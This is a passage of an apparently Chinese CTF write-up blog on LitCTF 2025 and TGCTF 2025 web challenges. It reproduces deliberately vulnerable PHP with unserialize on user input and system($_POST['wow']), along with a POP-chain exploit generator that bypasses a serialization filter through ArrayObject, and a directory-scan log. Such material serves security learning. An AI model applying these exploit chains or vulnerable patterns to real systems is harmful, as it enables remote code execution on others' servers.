__toString魔术方法，当对象被当作字符串使用时触发</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 调用soul对象的flag方法</span><br>        (<span class="hljs-variable language_">$this</span>-&gt;soul)-&gt;<span class="hljs-title function_ invoke__">flag</span>(<span class="hljs-variable">$this</span>-&gt;kuchikamizake,<span class="hljs-variable">$this</span>-&gt;name);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;call error!no flag!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 从POST请求中获取Litctf2025参数</span><br><span class="hljs-variable">$Litctf2025</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Litctf2025&#x27;</span>];<br><span class="hljs-comment">// 检查参数是否以&quot;O:&quot;或&quot;a:&quot;开头并跟着数字</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="hljs-variable">$Litctf2025</span>))&#123;<br>    <span class="hljs-comment">// 如果不匹配，则反序列化该参数</span><br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Litctf2025</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// 如果匹配，输出提示信息</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;把O改成C不就行了吗,笨蛋!～(∠・ω&lt; )⌒☆&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>反序列化，看看ai怎么说  </p>
<p>ai没用，但是找到了出题人的wp   </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Taki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$musubi</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$magic</span> = <span class="hljs-string">&quot;invoke&quot;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mitsuha</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$memory</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$thread</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KatawareDoki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$soul</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$kuchikamizake</span> = <span class="hljs-string">&quot;ReflectionFunction&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;\000lambda_1&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Taki</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Mitsuha</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">KatawareDoki</span>();<br><br><span class="hljs-variable">$a</span>-&gt;musubi = <span class="hljs-variable">$b</span>;		<span class="hljs-comment">// 1.把对象当成函数调用，触发__invoke()</span><br><span class="hljs-variable">$b</span>-&gt;thread = <span class="hljs-variable">$c</span>;		<span class="hljs-comment">// 2. 把对象作为字符串使用，触发__toString()</span><br><span class="hljs-variable">$c</span>-&gt;soul = <span class="hljs-variable">$a</span>;			<span class="hljs-comment">// 3. 调用不存在的方法，触发__call()</span><br><br><span class="hljs-variable">$arr</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;evil&quot;</span>=&gt;<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>(<span class="hljs-variable">$arr</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$d</span>));<br></code></pre></td></tr></table></figure>
<p>有没见过的知识点<br>其中是要调用一个匿名函数，还有是使用arrayobject类型来反序列化出C开头的payload来绕过</p>
<h1 id="TGCTF-2025"><a href="#TGCTF-2025" class="headerlink" title="TGCTF 2025"></a>TGCTF 2025</h1><h2 id="什么文件上传？"><a href="#什么文件上传？" class="headerlink" title="什么文件上传？"></a>什么文件上传？</h2><p>好像上传啥都回显 hacker  </p>
<p>浅浅扫一下目录  </p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[23:39:02]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /assets/<br><span class="hljs-selector-attr">[23:39:02]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">162</span>B  - /assets  -&gt;  http:<span class="hljs-comment">//127.0.0.1/assets/</span><br><span class="hljs-selector-attr">[23:39:04]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">162</span>B  - /css  -&gt;  http:<span class="hljs-comment">//127.0.0.1/css/</span><br><span class="hljs-selector-attr">[23:39:15]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">239</span>B  - /robots<span class="hljs-selector-class">.txt</span><br><span class="hljs-selector-attr">[23:39:19]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /upload<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[23:39:19]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /uploads/<br><span class="hljs-selector-attr">[23:39:19]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">162</span>B  - /uploads  -&gt;  http:<span class="hljs-comment">//127.0.0.1/uploads/</span><br></code></pre></td></tr></table></figure>
<p>原来前端里已经提示：机器人是啥？<br>在暗示有robots了  </p>
<p>robots:</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">User-Agent:</span> <span class="hljs-operator">*</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>admin<span class="hljs-symbol">/</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>private<span class="hljs-symbol">/</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-symbol">/baidu</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>s<span class="hljs-operator">?</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-symbol">/unlink</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-symbol">/phar</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">!</span>@<span class="hljs-operator">*</span>($^&amp;<span class="hljs-operator">*</span><span class="hljs-operator">!</span>@^&amp;<span class="hljs-operator">!</span><span class="hljs-operator">*</span>(@$<span class="hljs-comment"># &lt;--!文件上传后缀是三个小写字母 !@#$*&amp;^(!%@#$#^&amp;!--&gt;</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>class.php<br></code></pre></td></tr></table></figure>
<p>只有class.php 能连上<br>怎么是反序列化？  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">best64_decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$str</span>)))));<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">yesterday</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$learn</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$study</span>=<span class="hljs-string">&quot;study&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$try</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;learn = <span class="hljs-string">&quot;learn&lt;br&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You studied hard yesterday.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;study-&gt;<span class="hljs-title function_ invoke__">hard</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">today</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$doing</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$did</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$done</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;did = <span class="hljs-string">&quot;What you did makes you outstanding.&lt;br&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;done = <span class="hljs-string">&quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;done;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;doing))==<span class="hljs-number">666</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doing</span>();<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;doing-&gt;better;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tommoraw</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$good</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$bad</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$soso</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;good=<span class="hljs-string">&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;good;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;bad=<span class="hljs-string">&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;</span>;<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">future</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$impossible</span>=<span class="hljs-string">&quot;How can you get here?&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$out</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$no</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$useful1</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful2</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful3</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful4</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful5</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful6</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful7</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful8</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful9</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful10</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful11</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful12</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful13</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful14</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful15</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful16</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful17</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful18</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful19</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful20</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;out-&gt;useful7) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Seven is my lucky number&lt;br&gt;&quot;</span>;<br>                <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This is your future.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;wow&quot;</span>]);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;win&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;no = <span class="hljs-string">&quot;no&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;no;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Focus on the previous step!&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>],<span class="hljs-number">0</span>,-<span class="hljs-number">4</span>);<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">best64_decode</span>(<span class="hljs-variable">$data</span>));<br>    &#125;<br>    <span class="hljs-comment">// You learn yesterday, you choose today, can you get to your future?</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>ai注释一下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">// 显示当前文件的源代码</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-comment">// 关闭所有错误报告</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 定义一个多层base64解码的函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">best64_decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 对输入字符串进行5次base64解码</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$str</span>))));<br>    &#125;<br><br>    // 定义yesterday类<br>    <span class="hljs-keyword">class</span> yesterday &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$learn</span>;      // 公共属性learn<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$study</span>=<span class="hljs-string">&quot;study&quot;</span>;  // 公共属性study，默认值为<span class="hljs-string">&quot;study&quot;</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$try</span>;        // 公共属性<span class="hljs-keyword">try</span><br><br>        // 构造函数<br>        <span class="hljs-keyword">public</span> function <span class="hljs-title function_ invoke__">__construct</span>()<br>        &#123;<br>            // 初始化learn属性<br>            <span class="hljs-variable">$this</span>-&gt;learn = <span class="hljs-string">&quot;learn&lt;br&gt;&quot;</span>;<br>        &#125;<br><br>        // 析构函数<br>        <span class="hljs-keyword">public</span> function <span class="hljs-title function_ invoke__">__destruct</span>()<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You studied hard yesterday.&lt;br&gt;&quot;</span>;<br>            // 调用study对象的hard方法<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$this</span>-&gt;study-&gt;<span class="hljs-title function_ invoke__">hard</span>();<br>        &#125;<br>    &#125;<br><br>    // 定义today类<br>    <span class="hljs-keyword">class</span> today &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$doing</span>;  // 公共属性doing<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$did</span>;    // 公共属性did<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$done</span>;   // 公共属性done<br><br>        // 构造函数<br>        <span class="hljs-keyword">public</span> function <span class="hljs-title function_ invoke__">__construct</span>()&#123;<br>            // 初始化did属性<br>            <span class="hljs-variable">$this</span>-&gt;did = <span class="hljs-string">&quot;What you did makes you outstanding.&lt;br&gt;&quot;</span>;<br>        &#125;<br><br>        // 魔术方法：当调用不存在的方法时触发<br>        <span class="hljs-keyword">public</span> function <span class="hljs-title function_ invoke__">__call</span>(<span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span>)<br>        &#123;<br>            <span class="hljs-variable">$this</span>-&gt;done = <span class="hljs-string">&quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$this</span>-&gt;done;<br>            // 检查doing属性的双重MD5哈希是否等于<span class="hljs-number">666</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;doing))==<span class="hljs-number">666</span>)&#123;<br>                <span class="hljs-comment">// 调用doing属性作为函数</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doing</span>();<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">// 返回doing对象的better属性</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;doing-&gt;better;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 定义tommoraw类</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tommoraw</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$good</span>;   <span class="hljs-comment">// 公共属性good</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$bad</span>;    <span class="hljs-comment">// 公共属性bad</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$soso</span>;   <span class="hljs-comment">// 公共属性soso</span><br><br>        <span class="hljs-comment">// 魔术方法：当对象被当作函数调用时触发</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;good=<span class="hljs-string">&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;good;<br>        &#125;<br><br>        <span class="hljs-comment">// 魔术方法：当访问不存在的属性时触发</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;bad=<span class="hljs-string">&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 定义future类</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">future</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$impossible</span>=<span class="hljs-string">&quot;How can you get here?&lt;br&gt;&quot;</span>;  <span class="hljs-comment">// 私有属性impossible</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$out</span>;     <span class="hljs-comment">// 私有属性out</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$no</span>;      <span class="hljs-comment">// 私有属性no</span><br>        <span class="hljs-comment">// 多个公共属性</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$useful1</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful2</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful3</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful4</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful5</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful6</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful7</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful8</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful9</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful10</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful11</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful12</span>;<span class="hljs-keyword">public</span> <span 